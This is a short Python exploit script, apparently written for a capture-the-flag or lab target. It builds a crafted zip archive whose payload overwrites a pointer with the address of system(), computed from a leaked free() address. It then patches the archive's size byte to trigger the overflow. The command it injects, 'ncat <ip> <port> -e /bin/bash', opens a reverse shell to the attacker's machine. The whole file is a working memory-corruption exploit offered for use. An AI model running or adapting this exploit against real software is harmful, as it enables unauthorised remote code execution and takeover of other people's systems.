import struct
import zipfile
import sys

if len(sys.argv) != 4:
    print("redirect.py needs system address, local ip and port")
    print("> python3 redirect.py 0x123456789 10.10.10.10 9001")
    exit(1)

l = 96
command = b"ncat %b %b -e /bin/bash\x00" % (sys.argv[2].encode(), sys.argv[3].encode())
free = int(sys.argv[1], 16)

offset = -0x54670
system = struct.pack("Q", free + offset)

payload = command + b"a" * (l - len(command)) + b"\x00"*4 + system

with zipfile.ZipFile("redirect.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
    with zipf.open("payload.txt", "w") as f:
        f.write(payload)
        f.close()

    for i in range(1, 8):
        with zipf.open(f"dummy{str(i)}.txt", "w") as f:
            f.write(b"dummy")
            f.close()

    zipf.close()

zip = b""
with open("redirect.zip", "rb") as zipf:
    zip = zipf.read()
    zipf.close()

off = zip.find(bytes([len(payload)]))
print("Offset of payload size: " + hex(off))

zip = zip[:off] + b"\x24" + zip[off+1:]

with open("redirect.zip", "wb") as zipf:
    zipf.write(zip)
    zipf.close()

print("redirect.zip patched")